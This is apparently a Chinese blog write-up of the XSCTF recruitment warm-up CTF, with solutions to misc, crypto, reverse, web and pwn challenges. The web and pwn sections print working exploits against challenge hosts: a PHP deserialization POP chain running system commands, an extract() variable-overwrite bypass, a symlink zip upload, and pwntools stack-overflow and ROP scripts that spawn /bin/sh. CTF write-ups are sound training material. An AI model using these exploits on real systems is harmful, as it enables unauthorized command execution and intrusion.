---
title: XSCTF联合招新赛（热身赛）
date: 2022-10-21 21:27:31
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20221021205911855](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212101670.png?x-oss-process=hzy)

<!--more-->

--------------------------------------

# XSCTF 联合招新赛（热身赛）

# 前言

三天，15名，菜菜菜！！！

![image-20221021205911855](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212059176.png?x-oss-process=hzy)

# MISC

## B45364

> WVVoT2FtUkhXamRoUmxVeFRtcHNUMXBHT1V4aFYyeDVXVmRHUTJKSGVGTlpXREJMQ2c9PQo=

解码几次得到flag

hsctf{hU569Nd_KiiraaBllRa}

## phone_call

> 陈队给你打了个电话，让你永远要相信Ta。

俩个附件

![image-20221018173635634](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181737151.png?x-oss-process=hzy)

浅浅听了一下，发现音频是九键手机按键音，直接DTMF工具识别

![image-20221018175905054](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181759136.png?x-oss-process=hzy)

133562619159396

解压得到flag

flag = 'HSCTF{Y0ong_Yu4n_X1an9_X1n_Ch3n_Du!}'

## 鸠 打 电 话

> 鸠在给可恶的出题人打电话控诉题目太折磨，但由于出题人电话实在太太太难记了打了整整四遍才打对电话。
>
> 这个可恶的出题人居然还把电话拿来加密flag的压缩包了！罪大恶极！！！
>
> Clue 1：BV1z64y1S7SR
>
> Clue 2：最长的那段才是打通了的电话

什么鬼话，理解不了，手机号直接爆破算了

五分钟，，waiting。。。。。。



## 阳间题

![image-20221019190354125](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210191904589.png?x-oss-process=hzy)

```
3207357975641587136122466514425152961654613410728337142271750273124995105747053991640817066352343657398947248938255086358418100814441196784643527787764297
```

好吧，其实是这样的，010打开中文因为编码问题显示异常

```
艾尔登法环正式发售在即，迫不及待的mjj身上好像有蚂蚁在爬，写下了一句谜语：
3207357975641587136122466514425152961654613410728337142271750273124995105747053991640817066352343657398947248938255086358418100814441196784643527787764297
谜底就是flag，也是他给所有新生的祝福，希望大家享受解码的过程。
```

十进制转十六进制再转str

```
====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI
```

```
IZIUCUSEPNGDA5K7K4YHGX3ZOAZV6NC7NM2HC4TDOBPTAZC7MFYHO3TSGB6Q====
```

逆序输出base32解码再凯撒爆破得到flag

```
FQARD{L0u_W0s_yp3_4_k4qrcp_0d_apwnr0}
HSCTF{N0w_Y0u_ar3_4_m4ster_0f_crypt0}
```



## 一个小彩蛋！

> 听说只有聪明人才能看到这个彩蛋！
>
> 那能看到的你一定也是聪明人吧！
>
> 那聪明人一定已经拿到了Misc方向的B45364Reverse方向的2^11Crypto方向的二元一次方程组Web方向的头头是道PWN方向的babystack……的flag了吧！
>
> 那就来领取你的奖励吧！
>
> 把五个flag大括号包裹的内容按顺序相连最后塞进"hsctf{}"里就是这个彩蛋的flag哟~
>
> （不会吧不会吧，不会这都有聪明人不知道要交hsctf{flag1+flag2+flag3+flag4+flag5}并且没有"+"的flag吧）

hsctf{hU569Nd_KiiraaBllRaE1d3sTBrOth3r_CaR0IlikouleDl3F4TH3rRR4iin_AvAvAMast3rH0ssssT_dI@nQQBAdvV0mQn_QuE3nkun}

## image1

> 图片隐写

![image-20221021171510619](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211715685.png?x-oss-process=hzy)

flag{d2c3e80c-7687-4aae-8f90-70e43df97b6f}

## image2

还是图片隐写，010打开即可

flag{5eafbba3-f710-4fcc-9045-0b0a8b581ec5}

## image3

修改宽高，还是打开010

![image-20221021173115701](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211731791.png?x-oss-process=hzy)

![image-20221021173122802](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211731981.png?x-oss-process=hzy)

flag{2c44e767-e9b4-4b55-b75e-3504b515942f}

## image4

改成压缩包得到flag

flag{3f0283e0-e5d0-4084-816b-1237718a8630}

# WEB

## 头头是道

看header

![image-20221018174133631](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181741704.png?x-oss-process=hzy)

hsctf{Mast3rH0ssssT_dI@nQQ}

## warm_up

![image-20221018174222722](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181742846.png?x-oss-process=hzy)

考察XFF

![image-20221020132316151](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201323294.png?x-oss-process=hzy)

![image-20221020132430382](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201324481.png?x-oss-process=hzy)

Flag: hsctf{he1_hei_ran_r@n_w0_d3_rAn_Ran_00000000}

## ezser

> 魔术方法是什么东西捏？

基础pop chain

exp如下

```
<?php
class Fxizenta{
    public $b;
    public function __call($method,$attributes)
    {
        $this->sayhi();
    }
    public function sayhi()
    {
        echo "It's reversed! ctfer don't need girlfriend".$this->b;
    }

}
class Need{
    public $cmd ;
    public function __toString()
    {
        return system($this->cmd);  //backdoor
    }
}

class girlfriend{
    public $a;
    public function __destruct()
    {
        $this->a->meeting();
    }
}

$h = new Fxizenta();
$z = new Need();
$z ->cmd = 'cat flag.php';
$y = new girlfriend();
$y ->a = $h;
$h ->b = $z;

echo serialize($y);


?>
```

```
O:10:"girlfriend":1:{s:1:"a";O:8:"Fxizenta":1:{s:1:"b";O:4:"Need":1:{s:3:"cmd";s:12:"cat flag.php";}}}
```

flag在源码

![image-20221018200857673](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210182008773.png?x-oss-process=hzy)

flag{ctfer_d0nt_need_grilfriend}

## EZphp

> 我得想想怎么才能取而代之

题目如下

```
<?php
include 'flag.php';
extract($_GET);
if (isset($wsf)) {
    $xmm = trim(file_get_contents($zm));
    if ($xmm == $wsf) {
        if (!empty($xlq)) {
            $xw = trim(file_get_contents($fn));
            if ($xlq === $xw) {

                echo "<p>$flag</p>";
            } else {
                echo '<p>no no no </p>';
            }
        } else 'You cant do that!!';
    } else {
        echo 'hacker!!';
    }
} else {
    highlight_file(__FILE__);
}
?>
```

考察了两个地方，第一个是变量覆盖，第二个就是伪协议读取

> extract() 函数从[数组](https://so.csdn.net/so/search?q=数组&spm=1001.2101.3001.7020)中将变量导入到当前的符号表。
>
> 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。

这道题目是两道原题合到一块了，那两道题目在这

[(68条消息) web8--php函数extract（）、file_get_contents（）、trim（）_line_uc的博客-CSDN博客_php的函数trim(file_get_contents($zm))](https://blog.csdn.net/qq_32642035/article/details/104747801)

[(68条消息) bugku ctf 代码审计 extract变量覆盖_就是217的博客-CSDN博客_$content=trim(file_get_contents($file))](https://blog.csdn.net/qq_42777804/article/details/90414002)

![image-20221021140113342](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211401428.png?x-oss-process=hzy)

flag{phP_lS_th9_be5T_l4ngUa9e}

## updater

> the fireware need to update now

发现只能上传zip

![image-20221020133928389](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201339867.png?x-oss-process=hzy)

上传之后放到uploads文件夹下，并且文件名随机hash

![image-20221020134000028](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201340120.png?x-oss-process=hzy)

原题改的

[(67条消息) i春秋-ctf 文件上传_AAAAAAAAAAAA66的博客-CSDN博客_ctf上传文件](https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121217024)

![image-20221020134205026](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201342096.png?x-oss-process=hzy)

apache具有解析漏洞

> apache解析漏洞即遇到无法解析的后缀名就会向前解析
>
> eg:  h.php.aaa  会先解析aaa，无法解析后解析php
>
> 这样就可以绕过zip解压上传php文件了

后面就是跟上面那个原题解法差不多了

../../../../1.php.abc

but试了不行，发现说的gorget the readme，软链接指向readme.md,制作个压缩包



![image-20221021171643716](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211716794.png?x-oss-process=hzy)

![image-20221021171947477](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211719594.png?x-oss-process=hzy)

上传之后得到

![image-20221021172055069](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211720155.png?x-oss-process=hzy)

hsctf{sP4ce.bi1ibiLi。Conn/672328O9a}

## babyxss

![image-20221021170152095](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211701610.png?x-oss-process=hzy)

随便提交就会显示

![image-20221021170210236](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211702337.png?x-oss-process=hzy)

dir扫，发现其他路由---admin

![image-20221021170308422](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211703531.png?x-oss-process=hzy)

发现是一个可以实现查看提交的功能

提交了一个

![image-20221021170523155](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211705241.png?x-oss-process=hzy)

![image-20221021170527886](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211705975.png?x-oss-process=hzy)

出不来flag，check前面的别人传的，发现是下面这样的

![image-20221021203302881](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212033006.png?x-oss-process=hzy)

改一下ip和端口成自己的，然后提交之后check一下再一刷新就弹出来flag了

![image-20221021203438508](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212034581.png?x-oss-process=hzy)

![image-20221021203401659](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212034732.png?x-oss-process=hzy)

flag{b3cause_ba6y_u_arrre_so_beautiffffuuulll!!}

## easy_sql

> 嘉然，为了你我要打ctf！！！咦？这里这么注入不进去呢？奇怪

sql注入，是个登录框

![image-20221021140229833](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211402159.png?x-oss-process=hzy)

![image-20221021141049892](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211410965.png?x-oss-process=hzy)

访问robots.txt发现一个备份文件，但是文件名不全

![image-20221021141130145](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211411208.png?x-oss-process=hzy)

未出，没思路了，备份文件都下不来，脑洞了

# PWN

## babystack

> 非常简单的栈溢出
> nc 43.248.98.206 10041

信了就是简单的栈溢出

不过多说了，直接exp

```
from pwn import *
p = remote('43.248.98.206',10041)
#p = process("./babystack")
context.log_level = 'debug'
payload = b'a'*20+p64(0x401195)
p.sendline(payload)
p.interactive()
```

![image-20221018181605349](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181816411.png?x-oss-process=hzy)

hsctf{BAdvV0mQn_QuE3nkun}

## easyrop

rop

```
from pwn import *
#from LibcSearcher import *
context(log_level='debug',os='linux',arch='amd64')
r = remote("43.248.98.206",10046)
#r = process('./rop')
elf = ELF('./rop')


main=4007E3
scanf_plt = elf.plt['__isoc99_scanf']
PUTS_GOT = elf.got['puts']
RET = 0x004007D1
PUTS_PLT = elf.plt['puts']
MAIN_PLT = 0x4005F0
POP_RDI = 0x400873
pop_rsi_r15_ret = 0x0000000000400871
payload =  b'a'*(0x70+8)+ p64(POP_RDI) +p64(0x004008E9) + p64(pop_rsi_r15_ret) +p64(0x00601060+0x200)+p64(0)+p64(scanf_plt)+p64(RET)+p64(0x000000000400787)


r.sendline(payload)
r.sendline(b'/bin/sh;')

payload =  b'a'*(0x70+8)+ p64(POP_RDI) +p64(0x00601060+0x200) +p64(RET)+ p64(elf.plt['system'])

r.sendline(payload)
r.interactive()

```



![image-20221021133516416](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211335516.png?x-oss-process=hzy)

flag{6XqbzirmJmaSZdUP1egiCeoQ}

## 送flag

也是栈溢出，只不过保护机制多开了一个ELF随机地址

脚本如下

```
from pwn import *
context.log_level = 'debug'
#p=process('./song')
p=remote('43.248.98.206',10050)
p.recvuntil(b":")
m=p.recv(14)
c=str(m, encoding="utf-8")
sys=int(c,16)-0x14
payload=b'a'*(0x40+8)+p64(sys)
p.sendline(payload)
p.interactive()
```

hsctf{Z2l2ZXlvdWFmbGFn}

# CRYPTO

## baigeiRSA

> 白给了，白给了，真白给！

题目如下

```
import libnum
from Crypto.Util import number
from secret import flag

size = 128
e = 65537
p = number.getPrime(size)
q = number.getPrime(size)
n = p*q

m = libnum.s2n(flag)
c = pow(m, e, n)

print('n = %d' % n)
print('c = %d' % c)

```

```
n = 88503001447845031603457048661635807319447136634748350130947825183012205093541
c = 40876621398366534035989065383910105526025410999058860023908252093679681817257

```

知道n，c，e，n不大直接yafu分解

得到

```
p=274539690398523616505159415195049044439
q=322368694010594584041053487661458382819
```

剩下的就是一把梭了

```
#!/usr/bin/env python3
# coding:utf-8
#power by jedi

import gmpy2
import binascii


p = gmpy2.mpz(274539690398523616505159415195049044439)
q = gmpy2.mpz(322368694010594584041053487661458382819)
e = gmpy2.mpz(65537)
n=p*q
phi_n = (p-1)*(q-1)
d = gmpy2.invert(e, phi_n)
c = gmpy2.mpz(40876621398366534035989065383910105526025410999058860023908252093679681817257)

m = pow(c, d, n)
print("十进制:\n%s"%m)
m_hex = hex(m)[2:]
print("十六进制:\n%s"%(m_hex,))
#print("ascII:\n%s"%((binascii.b2a_hex(hex(m)[2:])).decode('hex'),))
print("ascii:\n%s"%(binascii.a2b_hex(m_hex).decode("utf8"),))

```

HSCTF{@Zh3n_Ba1_G3i!@}

## baigeiRSA2

> 既然白给，就多给一点吧！

题目如下

```
import libnum
from Crypto.Util import number
from functools import reduce
from secret import flag

n = 5
size = 64
while True:
    ps = [number.getPrime(size) for _ in range(n)]
    if len(set(ps)) == n:
        break

e = 65537
n = reduce(lambda x, y: x*y, ps)
m = libnum.s2n(flag)
c = pow(m, e, n)

print('n = %d' % n)
print('c = %d' % c)

```

```
n = 175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921
c = 144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168

```

64位RSA算法，靠yafu分解出来五个值，没遇到过这种情况，暂且放这

```
P19 = 9401433281508038261
P20 = 10252499084912054759
P20 = 11855687732085186571
P20 = 11215197893925590897
P20 = 13716847112310466417
```

exp

```
from Crypto.Util.number import *
from gmpy2 import *
n = 175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921
c = 144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168
e=65537
p=9401433281508038261
q=10252499084912054759
r3=11215197893925590897
r4=11855687732085186571
r5=13716847112310466417
d=invert(e,(p-1)*(q-1)*(r3-1)*(r4-1)*(r5-1))
m=pow(c,d,n)
print(long_to_bytes(m))

```

HSCTF{@Tv0_br3ad5_c1ip_cHe3se_!@}

## 二元一次方程组

题目如下

```
n = 5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601
avg = 75635892913589759545076958131039534718834447688923830032758709253942408722875
c = 888629627089650993173073530112503758717074884215641346688043288414489462472394318700014742820213053802180975816089493243275025049174955385229062207064503
```

```
import libnum
from Crypto.Util import number
from secret import flag


size = 256
e = 65537
p = number.getPrime(size)
q = number.getPrime(size)
avg = (p+q)/2
n = p*q

m = libnum.s2n(flag)
c = pow(m, e, n)

print('n = %d' % n)
print('avg = %d' % avg)
print('c = %d' % c)

```

二元一次方程可以解出来p和q

```
# n =p*q
# avg = (p+q)/2
# n = 5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601
# avg = 75635892913589759545076958131039534718834447688923830032758709253942408722875
```

破脚本总之是出来得数了，大佬不喜勿喷

```
from sympy import *

#定义变量
p = Symbol('p')
q = Symbol('q')
print(solve([p*q-5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601,(p+q)/2-75635892913589759545076958131039534718834447688923830032758709253942408722875],[p,q]))
#[(71087768052593510372666084538192216997254291933607002714885530754163087727843, 80184017774586008717487831723886852440414603444240657350631887753721729717907), (80184017774586008717487831723886852440414603444240657350631887753721729717907, 71087768052593510372666084538192216997254291933607002714885530754163087727843)]
```

```
p=71087768052593510372666084538192216997254291933607002714885530754163087727843
q=80184017774586008717487831723886852440414603444240657350631887753721729717907
c = 888629627089650993173073530112503758717074884215641346688043288414489462472394318700014742820213053802180975816089493243275025049174955385229062207064503
n = 5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601
e = 65537
```

然后再用上边第一个rsa的脚本就可以了

hsctf{Dl3F4TH3rRR4iin_AvAvA}

# RE

## 2^11

> 在sage里又是什么意思呢……？

主要逻辑如下

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // eax
  int v7; // eax
  int v8; // eax
  int v9; // edx
  WORD v10; // bx
  HANDLE v11; // eax
  int v12; // eax

  __main();
  p = (unsigned int)malloc(1u);
  while ( i-- )
  {
    v3 = -6 * i + 35;
    m[v3] = -1;
    v4 = 6 * i;
    m[v4] = m[v3];
    v5 = 35 - i;
    m[v5] = m[v4];
    m[i] = m[v5];
  }
  srand(p);
  __mingw_free(p);
  while ( (air || can) && c != 27 )
  {
    if ( c == 65 || c == 87 )
    {
      j = 30;
      i = 1;
      if ( c == 65 )
        v7 = -1;
      else
        v7 = -6;
      order(6, v7);
    }
    if ( c == 68 || c == 83 )
    {
      j = 6;
      i = -1;
      if ( c == 68 )
        v8 = 1;
      else
        v8 = 6;
      order(30, v8);
    }
    if ( c == 81 )
      exit(0);
    if ( air )
    {
      if ( !can )
      {
        --air;
        if ( !system("cls") )
        {
          do
            i = rand() % 30;
          while ( m[i] );
          if ( rand() % 5 )
            v9 = 1;
          else
            v9 = 2;
          m[i] = v9;
          p = (unsigned int)&unk_408098;
          while ( 1 )
          {
            p -= 4;
            if ( p - (_DWORD)m == 24 )
              break;
            if ( *(int *)p < -1 )
              *(_DWORD *)p = -*(_DWORD *)p;
          }
          while ( 1 )
          {
            p += 4;
            if ( p - (_DWORD)m == 124 )
              break;
            v10 = bg[*(_DWORD *)p % 12 + 1];
            v11 = GetStdHandle(0xFFFFFFF5);
            SetConsoleTextAttribute(v11, v10);
            if ( *(_DWORD *)p != -1 && (*(_DWORD *)p == *(_DWORD *)(p + 4) || *(_DWORD *)p == *(_DWORD *)(p + 24)) )
              ++can;
            if ( !(((int)(p - (_DWORD)m) >> 2) % 6) )
              _cputs("\n");
            if ( *(_DWORD *)p != -1 )
            {
              if ( *(_DWORD *)p )
                v12 = 1 << *(_DWORD *)p;
              else
                v12 = 0;
              _cprintf("%5d", v12);
            }
          }
          if ( !air && !can )
          {
            _cputs("Game over!");
            system("pause");
          }
          _cprintf("W - up\nA - left\nS - down\nD - right\nQ - quit\n");
          _cprintf("score:%d\n", score);
          if ( score > 2020 )
            secret();
        }
      }
    }
    LOBYTE(c) = _getch() & 0x5F;
    c = (unsigned __int8)c;
  }
  return 0;
}
```

![image-20221021212853054](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212128126.png?x-oss-process=hzy)

成绩达到2020就算成功，跟进secret函数

![image-20221021212928267](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212129334.png?x-oss-process=hzy)

脚本如下

```
a = 'H4ve_fun_w1th_R3verse_my_friend~'
b = '.X\x17\x02$#D\nl\x04e6\x1A\x10&[E\x17-0\x04\r]03\x0F\x19\x06\x10\x02\x01\x03'
flag = ''
for i in range(32):
    flag += chr(ord(a[i]) ^ ord(b[i]))
print(flag)

```

flag{E1d3sTBrOth3r_CaR0Ilikoule}

## baigeiXOR

> Tover嫌弃我出的题目太难了，于是抢了我的键盘出了这道白给题

flag{b4igei_baig3il3_zhenba1ge1}